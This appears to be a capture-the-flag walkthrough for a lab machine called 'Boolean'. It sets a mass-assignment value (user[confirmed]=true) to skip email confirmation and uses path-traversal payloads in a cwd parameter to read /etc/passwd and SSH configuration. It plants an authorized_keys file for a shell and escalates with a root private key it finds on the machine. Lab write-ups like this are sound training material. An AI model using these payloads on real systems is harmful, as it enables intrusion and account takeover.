`nmap -A -T4 -p- 192.168.110.231`

```
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open   http
| http-title: Boolean
|_Requested resource was http://192.168.110.231/login
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
3000/tcp  closed ppp
33017/tcp open   http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Development
```


So we mainly have two web servers being hosted on this target, on port 80 and 33017. Lets start enumerating these services and see what we can find.

# 80
On port 80 we are prompted by a login page for 'The Only True Free Storage' we can quickly test basic credentials or lookup credentials based on the app name. It doesn't appear that this application name finds anything and some basic credentials such as `admin:admin` `admin:password` did not work.

![](Images/Pasted%20image%2020250510114522.png)

Lets see if we can register a user to find anything further. We can use a temp email to get the confirmation email (If it actually sends something which I doubt it does).


```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.110.231:80/FUZZ
```

```
login                   [Status: 200, Size: 2413, Words: 452, Lines: 59, Duration: 158ms]
register                [Status: 200, Size: 2765, Words: 548, Lines: 66, Duration: 88ms]
404                     [Status: 200, Size: 1722, Words: 310, Lines: 68, Duration: 65ms]
500                     [Status: 200, Size: 1635, Words: 289, Lines: 67, Duration: 106ms]
422                     [Status: 200, Size: 1705, Words: 305, Lines: 68, Duration: 63ms]
filemanager             [Status: 302, Size: 94, Words: 5, Lines: 1, Duration: 79ms]
```

After making an account we are stuck on the confirmation page. Lets load this in burp and see if we can find anything of interest.

On our login request it seems like a standard post request passing our information to the server
![](Images/Pasted%20image%2020250510120451.png)

After the POST is does my guess is that it does some checks on the backend via the application.js and user_confim.js and if its all true it will allow us to file manager. 

In one of the post requests I see it responds with some json file which contains what it is checking for.

![](Images/Pasted%20image%2020250510121621.png)

If we can send the parameter `confirmed=true` it may let us in

Decoding the URL Encoded String in the post request for user email gets us the following so what if we pass the parameter for confirmed to be true.

```
user[email]=
user[confirmed]=
user%5Bconfirmed%5D=true
```

We get a successful update to the parameter through the API

![](Images/Pasted%20image%2020250510122028.png)

Now we should be able to login as the test user.

![](Images/Pasted%20image%2020250510122057.png)
# 33017

On 33017 we seem to have a blank webpage that doesn't really provide us with much as its for planned expansion

![](Images/Pasted%20image%2020250510114724.png)

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.110.231:33017/FUZZ
```

```
info                    [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 56ms]
admin                   [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 55ms]
cgi-bin                 [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 8125ms]
boolean                 [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 55ms]
```

Directory enumeration just shows we are unauthorized to the resources. Lets dig deeper into these to see if we can find anything.

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.110.231:33017/admin/FUZZ.php
```

![](Images/Pasted%20image%2020250510115821.png)

Finds us a cmd.php file within the admin directory that we have access to. Lets go there and see what we find. I tried treating this like a reverse shell and it did not seem to get any results. I think this isn't meant to be our foothold.

```
http://192.168.110.231:33017/admin/cmd.php?cmd=id
```

# Exploit

We were able to send a modified POST request in order to change the values of `user[confirmed]` to bypass email authentication and get access to the File Manager application. Now that we have direct file upload potential we can attempt to establish a shell. I am going to utilize a simple php reverse shell.

After uploading the file, it does not appear that we can get execution as it downloads the file from the URL below. When we see values in the URL we can most certainly test for LFI instead.

```
http://192.168.110.231/?cwd=&file=shell.php&download=true
```

After not getting execution lets do some basic LFI payload testing. Lets modify the file parameter and see if we can get file inclusion. It appears that its passing the `cwd` parameter to determine what directory to pull from and then pass the filename

So for LFI we would want to pass the following parameters as an example.

```
?cwd=../../../../../../../etc&file=passwd&download=true
```

After passing those parameters to the system we got the passwd file to download.

![](Images/Pasted%20image%2020250510123505.png)

So using this we know ssh is open, so what if we could download an SSH key and use that for authentication to establish a foothold.

We can easily grab the ssh config using the following

```
?cwd=../../../../../../../etc/ssh&file=ssh_config&download=no
```

```
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
```

After doing some testing with the application we can remove the parameters to show the directory on screen. Like the following

```
http://192.168.110.231/?cwd=../../../../../../../../../home/remi/.ssh
```

![](Images/Pasted%20image%2020250510124445.png)

This means we can directly upload a file to the users .ssh directory. Such as a authorized key. So lets do that and see if we can get authentication to the host.

```
ssh-keygen -t rsa
cp /home/yourusername/.ssh/id_rsa.pub authorized_keys
```

Then upload the authorized key to remi's ssh folder.

![](Images/Pasted%20image%2020250510124902.png)

```
cp /home/kali/.ssh/id_rsa id_rsa
```

Once the file is uploaded we can use our id_rsa to authenticate.

![](Images/Pasted%20image%2020250510124951.png)

First order of business is to grab the local flag.

![](Images/Pasted%20image%2020250510125019.png)
# Post Exploitation

As a nice way to get some quick information I will first start off my transfering over linpeas and running it to see if we can find anything interesting.

![](Images/Pasted%20image%2020250510125845.png)

First thing of note is that there is a local sql server running. Lets leave that for later if we get desperate.

We end up finding a root private SSH key 

![](Images/Pasted%20image%2020250510130318.png)

navigate to the keys directory and see if we can get escalation with it.

```
ssh -i root -o IdentitiesOnly=yes root@127.0.0.1
```

![](Images/Pasted%20image%2020250510131152.png)





